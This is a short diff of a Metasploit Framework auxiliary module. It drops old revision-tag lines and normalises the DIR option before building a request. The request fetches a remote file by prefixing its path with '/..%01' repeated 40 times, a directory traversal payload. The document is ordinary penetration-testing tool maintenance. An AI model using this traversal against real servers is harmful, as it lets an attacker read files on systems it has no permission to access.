@@ -1,8 +1,4 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # web site for more information on licensing and terms of use.
@@ -30,7 +26,6 @@ class Metasploit3 < Msf::Auxiliary
 			},
 			'Author'         => [ 'Matteo Cantoni <goony[at]nothink.org>' ],
 			'License'        => MSF_LICENSE,
-			'Version'        => '$Revision$',
 			'References'     =>
 				[
 					['OSVDB', '26772'],
@@ -70,7 +65,8 @@ class Metasploit3 < Msf::Auxiliary
 	def run
 		print_status("Attempting to retrieve #{datastore['RPATH']}...")
 
-		uri = Rex::Text.uri_encode(datastore['DIR']) + "/..%01" * 40 + Rex::Text.uri_encode(datastore['RPATH'])
+		dir = normalize_uri(datastore['DIR'])
+		uri = Rex::Text.uri_encode(dir) + "/..%01" * 40 + Rex::Text.uri_encode(datastore['RPATH'])
 
 		res = send_request_raw({
 			'uri'            => uri,
